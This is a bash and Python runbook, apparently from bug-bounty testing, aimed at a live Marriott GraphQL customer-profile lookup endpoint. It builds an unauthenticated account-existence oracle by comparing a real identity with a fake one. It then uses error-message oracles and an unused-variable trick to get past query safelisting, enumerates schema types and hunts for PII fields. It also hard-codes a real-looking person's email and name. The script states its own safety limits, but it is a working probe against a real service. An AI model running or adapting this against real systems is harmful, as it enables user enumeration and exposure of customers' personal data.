#!/usr/bin/env bash
# =============================================================================
# M022 SESSION 26 — UNION TYPE ENUMERATION + EXISTENCE ORACLE
# Portable: Linux / Pi / Termux.
#
# Discovery (S25): LookupCustomerProfilesResponse is a UNION:
#   union = CustomerProfileFound | UserInputError | (others?)
#   registered query selects only { code } on each member.
#
# This runbook:
#   A. Fire the EXACT registered query (own + synthetic identity) — is the op
#      reachable unauthenticated? Does it return CustomerProfileFound for a real
#      member and something else for a fake one? (existence oracle)
#   B. Enumerate ALL union members (inline-fragment error oracle).
#   C. Enumerate CustomerProfileFound fields (Cannot-query-field oracle) — looks
#      for PII fields (name, email, loyaltyId, customerId...) that would make a
#      successful lookup a cross-user data disclosure.
#
# SAFETY: own account + obviously-synthetic inputs ONLY. Read-only. No mutations.
# IMPORTANT: set OWN_* below to your REAL Bonvoy profile (first/last/country)
# or the lookup will not match and the oracle will read "not found".
#
# Run (Termux): OUTDIR=$HOME/s25 \
#   OWN_FIRST="Real" OWN_LAST="Name" OWN_COUNTRY="BD" \
#   bash runbooks/PI-RUNBOOK-session26-union-enum.sh 2>&1 | tee $HOME/s25/s26.log
# =============================================================================
set -eo pipefail

if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s25
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s25"
  else OUTDIR="$HOME/s25"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"

QUERY_BASE="https://auth-apc.marriott.com/mi/query"
OP="phoenixAccountLookupCustomerProfiles"

# Set these to your ACTUAL Bonvoy account values for a true-positive lookup.
export OWN_EMAIL="${OWN_EMAIL:-azmolhaque95@gmail.com}"
export OWN_FIRST="${OWN_FIRST:-Azmol}"
export OWN_LAST="${OWN_LAST:-Haque}"
export OWN_COUNTRY="${OWN_COUNTRY:-BD}"

echo "============================================================"
echo "M022 S26 UNION ENUM  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Work dir: $OUTDIR   IP: $(curl -s ifconfig.me)"
echo "Own identity: $OWN_FIRST $OWN_LAST / $OWN_EMAIL / $OWN_COUNTRY"
echo "============================================================"
echo ""

post() {  # $1=payload-file  $2=out-file
  curl -s "$QUERY_BASE/$OP" \
    -H 'content-type: application/json' -H 'application-name: account' \
    -d @"$1" -o "$2" \
    -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# PHASE A — EXACT REGISTERED QUERY (existence oracle)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: EXACT REGISTERED QUERY — own vs synthetic ═══"
echo ""

python3 << 'PYEOF'
import os, json
O = os.environ["OUTDIR"]
# Exact registered selection (unescaped). Add __typename so we can see which
# union member is returned without assuming field names.
sel = ("__typename "
       "... on CustomerProfileFound { code } "
       "... on UserInputError { code }")
q = ("query phoenixAccountLookupCustomerProfiles($input: LookupCustomerProfilesInput!) {"
     " lookupCustomerProfiles(input: $input) { " + sel + " } }")

def payload(email, first, last, country):
    return {"operationName":"phoenixAccountLookupCustomerProfiles",
            "variables":{"input":{"email":email,"firstName":first,"lastName":last,"country":country}},
            "query": q}

json.dump(payload(os.environ["OWN_EMAIL"], os.environ["OWN_FIRST"],
                  os.environ["OWN_LAST"], os.environ["OWN_COUNTRY"]),
          open(f"{O}/a1-own.json","w"))
json.dump(payload("qa-synthetic-noaccount-9z@example.invalid","Synthetic","Testcase","US"),
          open(f"{O}/a2-fake.json","w"))
print("built A1 (own real identity) + A2 (synthetic)")
PYEOF
echo ""

echo "[A1] OWN real identity:"
post "$OUTDIR/a1-own.json" "$OUTDIR/a1-own-body.txt"
echo "--- response ---"; cat "$OUTDIR/a1-own-body.txt"; echo; echo

echo "[A2] SYNTHETIC fake identity:"
post "$OUTDIR/a2-fake.json" "$OUTDIR/a2-fake-body.txt"
echo "--- response ---"; cat "$OUTDIR/a2-fake-body.txt"; echo; echo

echo "[A analysis]:"
python3 << 'PYEOF'
import os
O = os.environ["OUTDIR"]
own  = open(f"{O}/a1-own-body.txt").read()
fake = open(f"{O}/a2-fake-body.txt").read()
def cls(b):
    if '1012100' in b or 'Credentials invalid' in b: return "AUTH_REQUIRED (gated)"
    if '"code":"FORBIDDEN"' in b: return "FORBIDDEN (safelisting blocked)"
    if 'GRAPHQL_PARSE_FAILED' in b: return "PARSE_ERROR (query malformed)"
    if 'CustomerProfileFound' in b: return "CustomerProfileFound RETURNED (member exists)"
    if 'UserInputError' in b: return "UserInputError (no match / bad input)"
    if '"data"' in b: return "DATA envelope (inspect)"
    return "OTHER"
print("  A1 own      :", cls(own))
print("  A2 synthetic:", cls(fake))
print(f"  sizes: own={len(own.encode())}B  fake={len(fake.encode())}B")
if cls(own) != cls(fake):
    print("  >>> DIFFERENTIAL: real vs fake produce different union members.")
    print("  >>> = unauthenticated membership existence oracle by email+name+country.")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE B — UNION MEMBER ENUMERATION (inline-fragment oracle, bypass form)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: ENUMERATE UNION MEMBERS ═══"
echo "Oracle: '... on TypeX {__typename}' — invalid type => 'Unknown type' /"
echo "'cannot be spread'; valid member => only the unused-var validation error."
echo ""

python3 << 'PYEOF'
import os, json
O = os.environ["OUTDIR"]
candidates = [
  "CustomerProfileFound","CustomerProfileNotFound","CustomerProfilesFound",
  "MultipleProfilesFound","ProfileFound","ProfileNotFound","CustomerProfile",
  "CustomerProfilesResponse","UserInputError","ValidationError","RateLimitError",
  "NotFoundError","UnauthorizedError","Error","CustomerNotFound","TooManyResults",
  "AmbiguousResult","NoMatch","Match","CustomerMatch",
]
# Unused $z forces fall-through past safelisting to Apollo's validation layer.
for t in candidates:
    q = ("query phoenixAccountLookupCustomerProfiles("
         "$input: LookupCustomerProfilesInput!, $z: String) {"
         " lookupCustomerProfiles(input: $input) { ... on " + t + " { __typename } } }")
    json.dump({"operationName":"phoenixAccountLookupCustomerProfiles",
               "variables":{"input":{"email":"qa-x@example.invalid","firstName":"Q",
                            "lastName":"A","country":"US"}},
               "query": q}, open(f"{O}/b-{t}.json","w"))
open(f"{O}/b-candidates.txt","w").write("\n".join(candidates))
print(f"built {len(candidates)} union-member probes")
PYEOF

while read -r T; do
  [ -z "$T" ] && continue
  curl -s "$QUERY_BASE/$OP" \
    -H 'content-type: application/json' -H 'application-name: account' \
    -d @"$OUTDIR/b-$T.json" -o "$OUTDIR/b-$T-body.txt" -w "%{size_download}B" >/dev/null
  B=$(cat "$OUTDIR/b-$T-body.txt")
  if echo "$B" | grep -q "Unknown type\|cannot be spread\|can never be of type"; then
    echo "  ABSENT   $T"
  elif echo "$B" | grep -q '"code":"FORBIDDEN"'; then
    echo "  FORBIDDEN $T (safelisting re-engaged)"
  elif echo "$B" | grep -q "never used in operation"; then
    echo "  PRESENT  $T   <-- valid union member"
  else
    echo "  ?        $T  -> $(echo "$B" | head -c 120)"
  fi
done < "$OUTDIR/b-candidates.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE C — CustomerProfileFound FIELD ENUMERATION (PII hunt)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: ENUMERATE CustomerProfileFound FIELDS (PII hunt) ═══"
echo "Oracle: 'Cannot query field X on type CustomerProfileFound' => absent;"
echo "only 'unused var' error => field EXISTS."
echo ""

python3 << 'PYEOF'
import os, json
O = os.environ["OUTDIR"]
fields = [
  "code","id","customerId","consumerId","altCustomerId","externalId",
  "loyaltyId","loyaltyNumber","membershipId","membershipNumber","rewardsId",
  "memberNumber","firstName","lastName","fullName","name","email",
  "emailAddress","maskedEmail","phone","phoneNumber","maskedPhone","country",
  "address","postalCode","birthday","dateOfBirth","gender","status",
  "memberLevel","tier","profile","customer","customerProfile","matchScore",
  "matchType","gnr","marshaCode","__typename",
]
for f in fields:
    q = ("query phoenixAccountLookupCustomerProfiles("
         "$input: LookupCustomerProfilesInput!, $z: String) {"
         " lookupCustomerProfiles(input: $input) { ... on CustomerProfileFound { "
         + f + " } } }")
    json.dump({"operationName":"phoenixAccountLookupCustomerProfiles",
               "variables":{"input":{"email":"qa-x@example.invalid","firstName":"Q",
                            "lastName":"A","country":"US"}},
               "query": q}, open(f"{O}/c-{f}.json","w"))
open(f"{O}/c-fields.txt","w").write("\n".join(fields))
print(f"built {len(fields)} field probes")
PYEOF

PRESENT_FIELDS=""
while read -r F; do
  [ -z "$F" ] && continue
  curl -s "$QUERY_BASE/$OP" \
    -H 'content-type: application/json' -H 'application-name: account' \
    -d @"$OUTDIR/c-$F.json" -o "$OUTDIR/c-$F-body.txt" >/dev/null
  B=$(cat "$OUTDIR/c-$F-body.txt")
  if echo "$B" | grep -q "Cannot query field"; then
    echo "  absent   $F"
  elif echo "$B" | grep -q '"code":"FORBIDDEN"'; then
    echo "  FORBIDDEN $F"
  elif echo "$B" | grep -q "never used in operation"; then
    echo "  PRESENT  $F   <-- field exists on CustomerProfileFound"
    PRESENT_FIELDS="$PRESENT_FIELDS $F"
  else
    echo "  ?        $F -> $(echo "$B" | head -c 100)"
  fi
done < "$OUTDIR/c-fields.txt"
echo ""
echo "CustomerProfileFound fields present:$PRESENT_FIELDS"
echo "$PRESENT_FIELDS" > "$OUTDIR/cpf-present-fields.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# VERDICT
# ─────────────────────────────────────────────────────────────────────────────
echo "════════════════════════════════════════════"
echo "S26 VERDICT"
echo "════════════════════════════════════════════"
python3 << 'PYEOF'
import os
O = os.environ["OUTDIR"]
own  = open(f"{O}/a1-own-body.txt").read()
fake = open(f"{O}/a2-fake-body.txt").read()
present = open(f"{O}/cpf-present-fields.txt").read().split()
pii = [f for f in present if f.lower() not in ("code","__typename")]

print(f"CustomerProfileFound exposes {len(present)} fields; PII-like: {pii}")
print()
auth_gated = ('1012100' in own) or ('Credentials invalid' in own)
differential = (('CustomerProfileFound' in own) != ('CustomerProfileFound' in fake))

if pii:
    print(">>> IMPACT: CustomerProfileFound exposes identifying fields beyond 'code'.")
    print(">>> A successful email+name+country lookup returns another user's PII.")
if differential and not auth_gated:
    print(">>> IMPACT: unauthenticated existence oracle confirmed (real vs fake differ).")
if auth_gated:
    print(">>> Op is auth-gated for execution — but field/union enumeration above is")
    print(">>> unauthenticated and still proves the schema exposure.")
print()
print("NEXT: if PII fields exist AND op executes (CustomerProfileFound for own real")
print("identity), build ONE query selecting those fields with your OWN identity to")
print("capture a clean PoC. Do NOT query real third parties.")
PYEOF
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
